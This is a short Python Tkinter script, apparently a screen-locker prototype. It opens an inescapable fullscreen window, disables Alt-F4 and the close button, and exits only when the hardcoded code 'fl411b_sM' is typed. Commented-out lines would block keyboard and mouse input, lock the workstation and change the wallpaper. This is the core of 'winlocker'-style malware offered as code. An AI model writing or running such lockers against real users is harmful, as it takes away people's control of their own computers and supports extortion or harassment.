import ctypes
import keyboard
from tkinter import *

def do_exit():
    global pressed_f4
    if pressed_f4:  # Deny if Alt-F4 is pressed
        pressed_f4 = False  # Reset variable


def alt_f4(event):  # Alt-F4 is pressed
    global pressed_f4
    pressed_f4 = True


def clicked():
    n1, n2, n3 = 1, 2, 3

    s = txt.get()

    if s == f'{n1}':
        print(n1)
        # ctypes.windll.user32.SystemParametersInfoW(20, 0, f"{n1}.jpg", 0)
    elif s == f'{n2}':
        print(n2)
        # ctypes.windll.user32.SystemParametersInfoW(20, 0, f"{n2}.jpg", 0)
    elif s == f'{n3}':
        print(n3)
        # ctypes.windll.user32.SystemParametersInfoW(20, 0, f"{n3}.jpg", 0)
    elif s == 'fl411b_sM':
        window.quit()



pressed_CSE = False
pressed_f4 = False
window = Tk()
window["bg"] = "gray22"
window.attributes("-fullscreen", True)
# ctypes.windll.user32.LockWorkStation ()
# ctypes.windll.user32.BlockInput(True)w
txt = Entry(window, font="Arial 32", width=20, bg='grey27')
txt.focus()
txt.place(relx=0.3, rely=0.43)

btn = Button(window, text="Ввод", font='Arial 16', width=18, height=4, command=clicked, fg='red', bg='grey27').place(
    relx=0.7, rely=0.4)


window.bind('<Alt-F4>', alt_f4)

window.protocol("WM_DELETE_WINDOW", do_exit)

window.mainloop()
